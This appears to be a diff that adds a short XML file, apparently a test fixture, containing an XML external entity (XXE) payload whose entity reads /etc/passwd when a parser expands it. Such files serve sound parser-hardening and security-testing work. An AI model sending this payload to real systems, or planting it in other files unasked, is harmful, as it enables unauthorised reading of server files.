@@ -1,0 +1,7 @@
+<?xml version="1.0" encoding="UTF-8" ?>
+<!DOCTYPE s[
+<!ENTITY x0 SYSTEM "file:///etc/passwd">
+]>
+<foo>
+  <s>&x0;</s>
+</foo>
